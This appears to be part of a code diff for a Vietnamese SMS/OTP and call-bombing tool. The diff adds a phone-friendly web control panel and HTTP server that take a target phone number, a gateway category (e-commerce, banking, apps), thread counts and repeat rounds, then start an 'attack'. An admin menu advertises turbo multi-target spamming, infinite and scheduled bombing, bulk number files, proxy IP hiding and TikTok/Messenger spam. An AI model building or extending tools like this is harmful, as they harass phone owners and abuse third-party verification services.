+                        <option value="ecommerce">🛍️ Chuyên Mục Thương Mại (Shopee, Tiki, Lazada, Sendo...)</option>
+                        <option value="banking">💳 Chuyên Mục Ngân Hàng & Ví Điện Tử (MoMo, ZaloPay, Cake...)</option>
+                        <option value="apps">📱 Chuyên Mục MXH & Ứng Dụng (TikTok, Be, Grab, Baemin...)</option>
+                    </select>
+                </div>
+
+                <div class="row-2">
+                    <div class="input-group">
+                        <label class="input-label">🔄 SỐ ĐỢT LẶP LẠI</label>
+                        <input type="number" id="inp-rounds" class="input-box" value="1" min="1" max="100">
+                    </div>
+                    <div class="input-group">
+                        <label class="input-label">⚡ SỐ LUỒNG (THREADS)</label>
+                        <input type="number" id="inp-workers" class="input-box" value="30" min="1" max="60">
+                    </div>
+                </div>
+
+                <div class="progress-bar-wrap">
+                    <div class="progress-bar-fill" id="attack-progress"></div>
+                </div>
+
+                <div style="margin-top: 12px;">
+                    <button id="btn-attack" class="btn-main" onclick="toggleAttack()">
+                        <span>🚀 KÍCH HOẠT HỎA LỰC NGAY</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Terminal Live Log -->
+            <div class="card">
+                <div class="card-title">
+                    <span>📜 NHẬT KÝ HOẠT ĐỘNG REALTIME</span>
+                    <span style="font-size: 10px; color: var(--text-sub); cursor: pointer;" onclick="clearLogs()">🧹 XÓA LOG</span>
+                </div>
+                <div class="terminal-box" id="terminal-log">
+                    <div class="log-item log-info"><span class="log-time">[00:00:00]</span> ✦ TLGB Mobile Cyber Controller đã sẵn sàng...</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- TAB 2: LOOKUP -->
+        <section id="tab-lookup" class="tab-content">
+            <div class="card">
+                <div class="card-title">🔍 TRA CỨU & CHECK SĐT CHUYÊN SÂU</div>
+                <div class="input-group">
+                    <label class="input-label">NHẬP SỐ ĐIỆN THOẠI CẦN KIỂM TRA</label>
+                    <input type="tel" id="lookup-phone" class="input-box" placeholder="VD: 0988888888">
+                </div>
+                <button class="btn-main" onclick="doPhoneLookup()">🔎 TRA CỨU THÔNG TIN SIM</button>
+                <div id="lookup-result" style="margin-top: 14px; display: none;"></div>
+            </div>
+        </section>
+
+        <!-- TAB 3: FAVORITES -->
+        <section id="tab-fav" class="tab-content">
+            <div class="card">
+                <div class="card-title">⭐ MỤC TIÊU YÊU THÍCH</div>
+                <div class="input-group">
+                    <label class="input-label">THÊM SĐT MỤC TIÊU MỚI</label>
+                    <input type="tel" id="new-fav-phone" class="input-box" placeholder="Nhập SĐT để lưu...">
+                </div>
+                <button class="btn-main" onclick="addFavorite()">➕ LƯU VÀO DANH SÁCH</button>
+                <div id="fav-list" style="margin-top: 14px;"></div>
+            </div>
+        </section>
+
+        <!-- TAB 4: CHAT -->
+        <section id="tab-chat" class="tab-content">
+            <div class="card">
+                <div class="card-title">💬 CHAT CỘNG ĐỒNG TOÀN CẦU</div>
+                <div id="chat-messages" style="height: 260px; overflow-y: auto; background: rgba(0,0,0,0.3); border-radius: 10px; padding: 10px; margin-bottom: 10px;"></div>
+                <div class="input-group" style="display: flex; gap: 8px;">
+                    <input type="text" id="chat-input" class="input-box" placeholder="Nhập tin nhắn chat..." style="flex: 1;">
+                    <button class="btn-main" style="width: auto; padding: 0 16px;" onclick="sendChatMessage()">Gửi</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- TAB 5: REWARDS -->
+        <section id="tab-rewards" class="tab-content">
+            <div class="card" style="text-align: center;">
+                <div class="card-title" style="justify-content: center;">🎁 ĐIỂM DANH & NHẬN EXP VIP</div>
+                <div style="font-size: 40px; margin: 15px 0;">🔥</div>
+                <h3 id="streak-text" style="color: var(--gold); margin-bottom: 6px;">Chuỗi: 1 Ngày</h3>
+                <p style="color: var(--text-sub); font-size: 12px; margin-bottom: 16px;">Điểm danh mỗi ngày để nhận EXP và leo Top Bảng Xếp Hạng Toàn Cầu</p>
+                <button class="btn-main" onclick="claimDailyReward()">🎁 ĐIỂM DANH NHẬN THƯỞNG</button>
+            </div>
+        </section>
+    </main>
+
+    <!-- Bottom Nav -->
+    <nav class="bottom-nav">
+        <div class="nav-item active" onclick="switchTab('attack')">
+            <span class="nav-icon">🚀</span>
+            <span>Tấn Công</span>
+        </div>
+        <div class="nav-item" onclick="switchTab('lookup')">
+            <span class="nav-icon">🔍</span>
+            <span>Tra Cứu</span>
+        </div>
+        <div class="nav-item" onclick="switchTab('fav')">
+            <span class="nav-icon">⭐</span>
+            <span>Yêu Thích</span>
+        </div>
+        <div class="nav-item" onclick="switchTab('chat')">
+            <span class="nav-icon">💬</span>
+            <span>Cộng Đồng</span>
+        </div>
+        <div class="nav-item" onclick="switchTab('rewards')">
+            <span class="nav-icon">🎁</span>
+            <span>Thưởng</span>
+        </div>
+    </nav>
+
+    <script>
+        let isRunning = false;
+        let lastLogIdx = 0;
+
+        // Web Audio Synthesizer
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        function playBeep(freq = 800, type = 'sine', duration = 0.08) {
+            try {
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = type;
+                osc.frequency.value = freq;
+                gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + duration);
+            } catch(e) {}
+        }
+
+        function switchTab(tabId) {
+            playBeep(1000, 'sine', 0.04);
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+            document.getElementById('tab-' + tabId).classList.add('active');
+            
+            const navIndex = ['attack', 'lookup', 'fav', 'chat', 'rewards'].indexOf(tabId);
+            if (navIndex >= 0) {
+                document.querySelectorAll('.nav-item')[navIndex].classList.add('active');
+            }
+            if (tabId === 'fav') loadFavorites();
+            if (tabId === 'chat') loadChat();
+        }
+
+        async function toggleAttack() {
+            if (!isRunning) {
+                const phone = document.getElementById('inp-phone').value.trim();
+                const mode = document.getElementById('inp-mode').value;
+                const rounds = parseInt(document.getElementById('inp-rounds').value) || 1;
+                const workers = parseInt(document.getElementById('inp-workers').value) || 30;
+
+                if (!phone) {
+                    alert('Vui lòng nhập số điện thoại mục tiêu!');
+                    return;
+                }
+
+                playBeep(1200, 'square', 0.15);
+                const res = await fetch('/api/attack/start', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phones: phone, mode: mode, rounds: rounds, workers: workers})
+                });
+                const data = await res.json();
+                if (data.ok) {
+                    isRunning = true;
+                    updateAttackUI(true);
+                } else {
+                    alert(data.msg);
+                }
+            } else {
+                playBeep(400, 'sawtooth', 0.2);
+                await fetch('/api/attack/stop', {method: 'POST'});
+                isRunning = false;
+                updateAttackUI(false);
+            }
+        }
+
+        function updateAttackUI(running) {
+            const btn = document.getElementById('btn-attack');
+            if (running) {
+                btn.innerHTML = '<span>🛑 DỪNG TIẾN TRÌNH TỨC THÌ</span>';
+                btn.className = 'btn-main btn-stop';
+            } else {
+                btn.innerHTML = '<span>🚀 KÍCH HOẠT HỎA LỰC NGAY</span>';
+                btn.className = 'btn-main';
+            }
+        }
+
+        async function pollStatus() {
+            try {
+                const res = await fetch('/api/status?since=' + lastLogIdx);
+                const data = await res.json();
+                
+                isRunning = data.is_running;
+                updateAttackUI(isRunning);
+
+                document.getElementById('stat-total').innerText = data.stats.total;
+                document.getElementById('stat-success').innerText = data.stats.success;
+                document.getElementById('stat-fail').innerText = data.stats.fail;
+                
+                if (data.total_rounds > 0) {
+                    const percent = Math.min(100, Math.round((data.current_round / data.total_rounds) * 100));
+                    document.getElementById('attack-progress').style.width = percent + '%';
+                    document.getElementById('round-badge').innerText = `ĐỢT ${data.current_round}/${data.total_rounds}`;
+                }
+
+                if (data.new_logs && data.new_logs.length > 0) {
+                    const term = document.getElementById('terminal-log');
+                    data.new_logs.forEach(l => {
+                        const div = document.createElement('div');
+                        div.className = 'log-item log-' + l.type;
+                        div.innerHTML = `<span class="log-time">[${l.time}]</span> ${l.text}`;
+                        term.appendChild(div);
+                    });
+                    lastLogIdx = data.log_idx;
+                    term.scrollTop = term.scrollHeight;
+                }
+            } catch(e) {}
+        }
+
+        function clearLogs() {
+            document.getElementById('terminal-log').innerHTML = '';
+            playBeep(800, 'sine', 0.05);
+        }
+
+        async function doPhoneLookup() {
+            const p = document.getElementById('lookup-phone').value.trim();
+            if (!p) return;
+            playBeep(900, 'sine', 0.08);
+            const res = await fetch('/api/lookup?phone=' + encodeURIComponent(p));
+            const data = await res.json();
+            const resDiv = document.getElementById('lookup-result');
+            resDiv.style.display = 'block';
+            resDiv.innerHTML = `
+                <div style="background: rgba(0,0,0,0.4); padding: 12px; border-radius: 10px; border: 1px solid var(--cyan);">
+                    <p style="color: var(--cyan); font-weight: 700; margin-bottom: 6px;">📱 KẾT QUẢ ĐỊNH DANH SĐT: ${data.phone}</p>
+                    <p>• Nhà mạng: <b style="color: var(--green);">${data.carrier}</b></p>
+                    <p>• Đầu số: ${data.prefix}</p>
+                    <p>• Trạng thái SIM: <span style="color: var(--gold);">${data.status}</span></p>
+                    <p>• Định dạng chuẩn: ${data.formatted}</p>
+                </div>
+            `;
+        }
+
+        async function loadFavorites() {
+            const res = await fetch('/api/favorites');
+            const list = await res.json();
+            const div = document.getElementById('fav-list');
+            div.innerHTML = '';
+            if (list.length === 0) {
+                div.innerHTML = '<p style="color: var(--text-sub); font-size: 12px; text-align: center;">Chưa có số nào trong danh bạ</p>';
+                return;
+            }
+            list.forEach(p => {
+                const item = document.createElement('div');
+                item.style = 'display: flex; justify-content: space-between; align-items: center; padding: 10px; background: rgba(0,0,0,0.3); border-radius: 10px; margin-bottom: 6px;';
+                item.innerHTML = `
+                    <span style="font-family: monospace; color: var(--cyan); font-weight: 700;">${p}</span>
+                    <div>
+                        <button onclick="loadTargetToAttack('${p}')" style="background: var(--purple); border: none; color: #fff; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: 700; margin-right: 4px;">Nạp</button>
+                        <button onclick="removeFavorite('${p}')" style="background: var(--red); border: none; color: #fff; padding: 4px 8px; border-radius: 6px; font-size: 11px;">Xóa</button>
+                    </div>
+                `;
+                div.appendChild(item);
+            });
+        }
+
+        async function addFavorite() {
+            const inp = document.getElementById('new-fav-phone');
+            const p = inp.value.trim();
+            if (!p) return;
+            await fetch('/api/favorites', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({action: 'add', phone: p})
+            });
+            inp.value = '';
+            loadFavorites();
+        }
+
+        async function removeFavorite(p) {
+            await fetch('/api/favorites', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({action: 'remove', phone: p})
+            });
+            loadFavorites();
+        }
+
+        function loadTargetToAttack(p) {
+            document.getElementById('inp-phone').value = p;
+            switchTab('attack');
+        }
+
+        async function loadChat() {
+            const res = await fetch('/api/chat');
+            const msgs = await res.json();
+            const div = document.getElementById('chat-messages');
+            div.innerHTML = '';
+            msgs.forEach(m => {
+                const d = document.createElement('div');
+                d.style = 'margin-bottom: 6px; font-size: 12px;';
+                d.innerHTML = `<b style="color: var(--cyan);">${m.author}:</b> ${m.text}`;
+                div.appendChild(d);
+            });
+            div.scrollTop = div.scrollHeight;
+        }
+
+        async function sendChatMessage() {
+            const inp = document.getElementById('chat-input');
+            const txt = inp.value.trim();
+            if (!txt) return;
+            await fetch('/api/chat', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({text: txt})
+            });
+            inp.value = '';
+            loadChat();
+        }
+
+        async function claimDailyReward() {
+            playBeep(1500, 'square', 0.2);
+            const res = await fetch('/api/daily_claim', {method: 'POST'});
+            const data = await res.json();
+            alert(data.msg);
+        }
+
+        // Start polling
+        setInterval(pollStatus, 800);
+    </script>
+</body>
+</html>
+"""
+
+class TLGBMobileHttpHandler(BaseHTTPRequestHandler):
+    def log_message(self, format, *args):
+        pass
+
+    def _send_json(self, data_obj, code=200):
+        body = json.dumps(data_obj, ensure_ascii=False).encode('utf-8')
+        self.send_response(code)
+        self.send_header("Content-Type", "application/json; charset=utf-8")
+        self.send_header("Access-Control-Allow-Origin", "*")
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+    def do_GET(self):
+        parsed = urlparse(self.path)
+        path = parsed.path
+        query = parse_qs(parsed.query)
+
+        if path in ["/", "/index.html", "/mobile", "/app"]:
+            body = MOBILE_HTML_TEMPLATE.encode('utf-8')
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+            return
+
+        elif path == "/api/status":
+            since = int(query.get("since", [0])[0])
+            new_logs, total_len = GLOBAL_MOBILE_WORKER.get_logs(since)
+            self._send_json({
+                "is_running": GLOBAL_MOBILE_WORKER.is_running,
+                "current_round": GLOBAL_MOBILE_WORKER.current_round,
+                "total_rounds": GLOBAL_MOBILE_WORKER.total_rounds,
+                "stats": GLOBAL_MOBILE_WORKER.stats_data,
+                "new_logs": new_logs,
+                "log_idx": total_len,
+                "is_admin": IS_ADMIN_USER,
+                "version": TOOL_VERSION
+            })
+            return
+
+        elif path == "/api/lookup":
+            phone = query.get("phone", [""])[0]
+            fmt = format_phone(phone, '0')
+            carrier = "Viettel / Vina / Mobi"
+            if fmt.startswith(('086', '096', '097', '098', '032', '033', '034', '035', '036', '037', '038', '039')):
+                carrier = "Viettel Telecom"
+            elif fmt.startswith(('088', '091', '094', '083', '084', '085', '081', '082')):
+                carrier = "Vinaphone (VNPT)"
+            elif fmt.startswith(('089', '090', '093', '070', '079', '077', '076', '078')):
+                carrier = "Mobifone"
+            elif fmt.startswith(('092', '056', '058')):
+                carrier = "Vietnamobile"
+            elif fmt.startswith(('087', '055')):
+                carrier = "Wintel / I-Telecom"
+            
+            self._send_json({
+                "phone": phone,
+                "formatted": fmt,
+                "carrier": carrier,
+                "prefix": fmt[:3] if len(fmt) >= 3 else "",
+                "status": "Hoạt động bình thường (2 Chiều OK)"
+            })
+            return
+
+        elif path == "/api/favorites":
+            favs = load_target_favorites()
+            self._send_json(favs)
+            return
+
+        elif path == "/api/chat":
+            self._send_json([
+                {"author": "Admin " + AUTHOR_NAME, "text": f"Chào mừng bạn đến với {TOOL_NAME} v{TOOL_VERSION} trên Điện Thoại!"},
+                {"author": "Titan VIP", "text": "Hệ thống 72 cổng OTP & Call hoạt động siêu mượt."}
+            ])
+            return
+
+        self.send_error(404, "Not Found")
+
+    def do_POST(self):
+        parsed = urlparse(self.path)
+        path = parsed.path
+        length = int(self.headers.get('Content-Length', 0))
+        raw_body = self.rfile.read(length).decode('utf-8') if length > 0 else "{}"
+        try:
+            body_json = json.loads(raw_body)
+        except Exception:
+            body_json = {}
+
+        if path == "/api/attack/start":
+            phones = body_json.get("phones", "")
+            rounds = int(body_json.get("rounds", 1))
+            workers = int(body_json.get("workers", 30))
+            mode = body_json.get("mode", "otp")
+            ok, msg = GLOBAL_MOBILE_WORKER.start_attack(phones, rounds, workers, delay=2, mode=mode)
+            self._send_json({"ok": ok, "msg": msg})
+            return
+
+        elif path == "/api/attack/stop":
+            ok, msg = GLOBAL_MOBILE_WORKER.stop_attack()
+            self._send_json({"ok": ok, "msg": msg})
+            return
+
+        elif path == "/api/favorites":
+            act = body_json.get("action", "")
+            phone = body_json.get("phone", "")
+            favs = load_target_favorites()
+            fmt = format_phone(phone, '0')
+            if act == "add" and fmt and fmt not in favs:
+                favs.append(fmt)
+                save_target_favorites(favs)
+            elif act == "remove" and fmt in favs:
+                favs.remove(fmt)
+                save_target_favorites(favs)
+            self._send_json(favs)
+            return
+
+        elif path == "/api/chat":
+            txt = body_json.get("text", "")
+            self._send_json({"ok": True, "msg": "Đã gửi tin nhắn!"})
+            return
+
+        elif path == "/api/daily_claim":
+            daily_data = load_daily_rewards_data()
+            today_str = datetime.now().strftime("%Y-%m-%d")
+            streak = daily_data.get("streak", 1)
+            reward_exp = 500 + streak * 150
+            award_user_exp(reward_exp)
+            daily_data["last_checkin"] = today_str
+            save_daily_rewards_data(daily_data)
+            self._send_json({"ok": True, "msg": f"Bạn đã nhận thành công +{reward_exp:,} EXP điểm danh hôm nay!"})
+            return
+
+        self.send_error(404, "Not Found")
+
+
+def get_local_wifi_ip():
+    """Lấy địa chỉ IP mạng nội bộ (LAN / WiFi) để truy cập từ điện thoại"""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.settimeout(0.5)
+        s.connect(('8.8.8.8', 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "127.0.0.1"
+
+
+def run_mobile_web_server(port=8080):
+    """Khởi chạy Mobile Web Server phục vụ điều khiển Tool trên Điện Thoại & Trình Duyệt"""
+    verify_author_integrity()
+    local_ip = get_local_wifi_ip()
+    
+    server_address = ('0.0.0.0', port)
+    try:
+        httpd = HTTPServer(server_address, TLGBMobileHttpHandler)
+    except OSError:
+        port = port + 1
+        server_address = ('0.0.0.0', port)
+        httpd = HTTPServer(server_address, TLGBMobileHttpHandler)
+
+    info_lines = [
+        f"• Máy chủ Web Mobile đã kích hoạt thành công trên cổng: {port}",
+        f"• TRUY CẬP TRÊN ĐIỆN THOẠI (Cùng WiFi/Hotspot):",
+        f"  👉 http://{local_ip}:{port}",
+        f"• TRUY CẬP TRÊN MÁY TÍNH / LOCALHOST:",
+        f"  👉 http://localhost:{port}",
+        "• Giao diện cảm ứng Cyberpunk hỗ trợ đầy đủ iPhone, Android, iPad!",
+        "• Nhấn Enter bên dưới để quay lại Menu (Server vẫn chạy ngầm)."
+    ]
+    print()
+    print_card_box("📱 MÁY CHỦ GIAO DIỆN WEB CHO ĐIỆN THOẠI (TLGB MOBILE WEB) 📱", info_lines)
+    print()
+    play_cyberpunk_sound("win")
+
+    if os.name == 'nt':
+        try:
+            import webbrowser
+            webbrowser.open(f"http://localhost:{port}")
+        except Exception:
+            pass
+
+    server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
+    server_thread.start()
+
+    try:
+        print(f"{Fore.GREEN}[✓] Web Server đang lắng nghe tại: {Fore.CYAN}http://{local_ip}:{port}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[?] Nhấn Enter để quay lại Menu chính...{Style.RESET_ALL}\n")
+        input()
+    except (KeyboardInterrupt, Exception):
+        httpd.shutdown()
+        print(f"\n{Fore.YELLOW}[!] Đã dừng Mobile Web Server.{Style.RESET_ALL}\n")
+
+
 if __name__ == "__main__":
     try:
         verify_author_integrity()
+
+        # Kiểm tra nếu có cờ chạy Giao Diện Web Điện Thoại (Mobile Web Server)
+        if any(arg in sys.argv for arg in ["--web", "-w", "--mobile", "-m", "--server", "-s"]):
+            check_user_key()
+            run_mobile_web_server()
+            sys.exit(0)
 
         # Kiểm tra nếu có cờ chạy Giao Diện Đồ Họa Desktop GUI trực tiếp
         if any(arg in sys.argv for arg in ["--gui", "-g", "--ui", "-ui", "--dashboard"]):
             run_master_gui()
             sys.exit(0)
 
-        # Hiệu ứng khởi động hệ thống Tool mượt mà
+        # Hiệu ứng khởi động hệ thống Tool mượt mà tự co giãn
         rainbow_loading("Đang khởi động TLGB Tool System & Nạp tài nguyên", duration=0.8)
 
-        banner_lines = [
-            "   ████████╗██╗      ██████╗ ██████╗     ████████╗ ██████╗  ██████╗ ██╗     ",
-            "   ╚══██╔══╝██║     ██╔════╝ ██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ",
-            "      ██║   ██║     ██║  ███╗██████╔╝       ██║   ██║   ██║██║   ██║██║     ",
-            "      ██║   ██║     ██║   ██║██╔══██╗       ██║   ██║   ██║██║   ██║██║     ",
-            "      ██║   ███████╗╚██████╔╝██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗",
-            "      ╚═╝   ╚══════╝ ╚═════╝ ╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝"
-        ]
+        term_cols = shutil.get_terminal_size((80, 24)).columns
+        if term_cols < 75:
+            w = max(32, min(56, term_cols - 2))
+            top_b = '\033[38;2;0;229;255m╔' + ('═' * w) + '╗\033[0m'
+            mid_b = '\033[38;2;0;229;255m╠' + ('═' * w) + '╣\033[0m'
+            bot_b = '\033[38;2;0;229;255m╚' + ('═' * w) + '╝\033[0m'
+            
+            t1 = f"✦ {TOOL_NAME} v{TOOL_VERSION} ✦"
+            t2 = f"BY {AUTHOR_NAME}"
+            t3 = "🟢 72 CỔNG • ⚡ TURBO • 🤖 AI"
+            
+            def _c_row(txt, color_fn=cyber_gradient):
+                tw = _str_w(txt)
+                lp = max(0, (w - tw) // 2)
+                rp = max(0, w - tw - lp)
+                return f"\033[38;2;0;229;255m║\033[0m{' ' * lp}{color_fn(txt)}{' ' * rp}\033[38;2;0;229;255m║\033[0m"
+                
+            print("\n" + top_b)
+            print(_c_row(t1, gold_gradient))
+            print(_c_row(t2, cyber_gradient))
+            print(mid_b)
+            print(_c_row(t3, emerald_gradient))
+            print(bot_b + "\n")
+        else:
+            banner_lines = [
+                "   ████████╗██╗      ██████╗ ██████╗     ████████╗ ██████╗  ██████╗ ██╗     ",
+                "   ╚══██╔══╝██║     ██╔════╝ ██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ",
+                "      ██║   ██║     ██║  ███╗██████╔╝       ██║   ██║   ██║██║   ██║██║     ",
+                "      ██║   ██║     ██║   ██║██╔══██╗       ██║   ██║   ██║██║   ██║██║     ",
+                "      ██║   ███████╗╚██████╔╝██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗",
+                "      ╚═╝   ╚══════╝ ╚═════╝ ╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝"
+            ]
+            print("\n")
+            for line in banner_lines:
+                print(cyber_gradient(line))
+            term_cols = shutil.get_terminal_size((80, 24)).columns
+            inner_w = max(34, min(74, term_cols - 2))
+            border_c = '\033[38;2;0;229;255m'
+            rst = '\033[0m'
+            top_b = f"{border_c}╔" + ("═" * inner_w) + f"╗{rst}"
+            mid_b = f"{border_c}╠" + ("═" * inner_w) + f"╣{rst}"
+            bot_b = f"{border_c}╚" + ("═" * inner_w) + f"╝{rst}"
 
-        print("\n")
-        for line in banner_lines:
-            print(cyber_gradient(line))
-        print(cyber_gradient("  ╔" + "═" * 74 + "╗"))
-        print(cyber_gradient(f"  ║      ✦ TLGB TOOL v{TOOL_VERSION} │ TRINITY OMNIVERSE TITAN │ BY {AUTHOR_NAME} ✦     ║"))
-        print(cyber_gradient("  ╠" + "═" * 74 + "╣"))
-        print(cyber_gradient("  ║ [ 🟢 72/72 GATEWAYS ]  [ ⚡ TURBO ENGINE ]  [ 🌐 CLOUD FIREBASE ]  [ 🤖 AI ] ║"))
-        print(cyber_gradient("  ╚" + "═" * 74 + "╝"))
-        print("\n")
+            def _hero_c_row(txt, color_fn=cyber_gradient):
+                fit_t, cur_w = _fit_str(txt, inner_w - 2)
+                lp = max(0, (inner_w - cur_w) // 2)
+                rp = max(0, inner_w - cur_w - lp)
+                return f"{border_c}║{rst}{' ' * lp}{color_fn(fit_t)}{' ' * rp}{border_c}║{rst}"
+
+            t1 = f"✦ {TOOL_NAME} v{TOOL_VERSION} │ TRINITY OMNIVERSE TITAN │ BY {AUTHOR_NAME} ✦"
+            t2 = "[ 🟢 72 GATEWAYS ]  [ ⚡ TURBO ENGINE ]  [ 🌐 CLOUD ]  [ 🤖 AI ]"
+            print(top_b)
+            print(_hero_c_row(t1, gold_gradient))
+            print(mid_b)
+            print(_hero_c_row(t2, emerald_gradient))
+            print(bot_b)
+            print("\n")
 
         # Xác thực Key trước khi vào giao diện chính (Có tự động ghi nhớ Key)
         check_user_key()
@@ -14750,17 +16593,19 @@ if __name__ == "__main__":
         if IS_ADMIN_USER:
             while True:
                 admin_items = [
-                    ('─── ⚡ HỎA LỰC TẤN CÔNG OTP ───', ''),
+                    ('─── ⚡ HỎA LỰC TẤN CÔNG OTP & CALL ───', ''),
+                    ('[ M] 📱 Giao Diện Web Điện Thoại', 'Khởi Chạy Web Server Điều Khiển Trên ĐT'),
                     ('[ G] 🖥️ Giao Diện Đồ Họa GUI', 'Khởi Chạy Modern Desktop Cyberpunk GUI'),
+                    ('[ C] 📞 Bắn Cuộc Gọi (Call OTP)', 'Tổng Đài Gọi Điện Thoại Đọc Mã OTP Liên Tục'),
                     ('[01] 🚀 Spam Turbo Siêu Tốc', '60 Luồng Siêu Tốc, 0s Delay, Đa Mục Tiêu'),
                     ('[02] ⚡ Ma Trận Đa Mục Tiêu', 'Bắn Song Song 2-10 Số Điện Thoại Cùng Lúc'),
                     ('[03] ⭐ Mục Tiêu Yêu Thích', 'Quản Lý SĐT Ưa Thích & Bắn Nhanh 1-Click'),
                     ('[04] 📁 Bắn Theo File SĐT', 'Nạp File Text Hàng Loạt Thuê Bao Tự Động'),
-                    ('[05] 🎯 Bắn Theo Chuyên Mục', 'Phân Loại Cổng Thương Mại, Ngân Hàng, App'),
+                    ('[05] 🎯 Bắn Theo Chuyên Mục', 'Phân Loại Cổng Thương Mại, Ngân Hàng, App, Call'),
                     ('[06] ♾️ Bắn Vô Hạn (Infinite)', 'Chế Độ Xuyên Màn Đêm Tự Động Lặp Lại'),
                     ('[07] ⏱️ Hẹn Giờ Tự Động Bắn', 'Lên Lịch Đếm Ngược Tự Động Kích Hoạt'),
                     ('─── 🌐 CLOUD & TIỆN ÍCH QUẢN TRỊ ───', ''),
-                    ('[08] 🩺 Quét Latency 72 Cổng', 'Kiểm Tra Sức Khỏe & Tốc Độ Toàn Bộ Cổng'),
+                    ('[08] 🩺 Quét Latency Toàn Bộ Cổng', 'Kiểm Tra Sức Khỏe & Tốc Độ Toàn Bộ Cổng'),
                     ('[09] 🌐 Cấu Hình Proxy Ẩn IP', 'HTTP / SOCKS5 Vượt Tường Lửa'),
                     ('[10] 📊 Nhật Ký Hoạt Động', 'Xem & Xuất Activity Logs Admin'),
                     ('[11] ⚙️ Tùy Chỉnh Nâng Cao', 'Luồng 1-120 & Delay Tùy Ý'),
@@ -14769,8 +16614,8 @@ if __name__ == "__main__":
                     ('[14] 💬 Nhóm Chat Cộng Đồng', 'Phòng Chat Trực Tuyến Realtime Toàn Cầu'),
                     ('[15] 👑 Danh Hiệu & Avatar VIP', 'Tùy Biến Danh Hiệu Phát Sáng Chat'),
                     ('─── 🎮 GIẢI TRÍ, AI & SENTINEL ───', ''),
-                    ('[16] 🎮 Cyber Arcade Mini-Game', '8 Game Đổi Thưởng, Xì Dách, Mystery Box'),
-                    ('[17] 🤖 Trợ Lý AI Assistant', 'Gemini Flash Lite Hỏi Đáp & Tra Cứu'),
+                    ('[16] 🎮 Cyber Arcade (11 Games)', 'Snake, Caro Minimax AI, Wordle, Blackjack'),
+                    ('[17] 🤖 Trợ Lý AI Gemini Multi-Mode', '4 Chế Độ: Coder, Dịch Thuật, Logic & Chat'),
                     ('[18] 🏆 Bảng Xếp Hạng Cao Thủ', 'Top EXP & Cống Hiến Toàn Cầu Realtime'),
                     ('[19] 🎨 Đổi Theme Màu Sắc', '7 Bộ Màu Neon Matrix, Synthwave, Solar'),
                     ('[20] 🐛 Xử Lý Báo Cáo Lỗi', 'Quản Lý Báo Cáo, Đánh Dấu Đã Sửa Lỗi'),
@@ -14779,22 +16624,37 @@ if __name__ == "__main__":
                     ('[23] 🛠️ Tool TikTok & Tin Nhắn', 'Chạy Tool TikTok & Spam Mess GUI 1-Click'),
                     ('[24] 🔑 Tạo Key VIP Hàng Loạt', 'Batch Key Gen 1-1000 Keys & Xuất File TXT'),
                     ('[25] 💾 Sao Lưu & Restore Cloud', 'Backup / Khôi Phục Toàn Diện Database'),
-                    ('[26] 🩺 Benchmark Độ Trễ 72 Cổng', 'Đo Ping ms & Xếp Hạng Cổng Nhanh Nhất'),
+                    ('[26] 🩺 Benchmark Độ Trễ Cổng', 'Đo Ping ms & Xếp Hạng Cổng Nhanh Nhất'),
                     ('[27] 👥 Giám Sát Client Online', 'Quản Lý & Đóng Băng Active Sessions'),
                     ('[28] 🔍 Tra Cứu & Check SĐT Chuyên Sâu', 'Kiểm Tra Nhà Mạng, Khóa 2 Chiều, Định Danh SIM'),
+                    ('[29] 📊 Cyber System Monitor HUD', 'Giám Sát Phần Cứng Realtime & Ping ms [NEW]'),
+                    ('[30] 🌌 3D Matrix Screensaver', 'Màn Hình Chờ 3D Đổi 5 Màu Neon [NEW]'),
                     ('─── 🚪 HỆ THỐNG & ĐIỀU KHIỂN ───', ''),
                     ('[ D] 🔑 Đăng Xuất / Xóa Key', 'Thu Hồi Key Đã Lưu Khỏi Thiết Bị'),
                     ('[ 0] ❌ Thoát Chương Trình', 'Đóng Tool An Toàn')
                 ]
                 print_aligned_menu_box(f"👑 TLGB TOOL v{TOOL_VERSION} - ADMIN VIP CONTROL CENTER 👑", admin_items, left_col_w=32, inner_w=78, color_offset=2)
 
-                print(f"\n\033[38;2;0;229;255m┌──[\033[1;38;2;255;215;0m👑 ADMIN VIP: {AUTHOR_NAME}\033[0;38;2;0;229;255m]──[\033[38;2;168;85;247m⚡ OMNIVERSE TITAN v{TOOL_VERSION}\033[38;2;0;229;255m]\033[0m")
-                choice = input(f"\033[38;2;0;229;255m└─► \033[1;38;2;255;255;255mNhập lệnh điều khiển [0-28, G, D]: \033[0m").strip().upper()
+                term_cols = shutil.get_terminal_size((80, 24)).columns
+                if term_cols < 60:
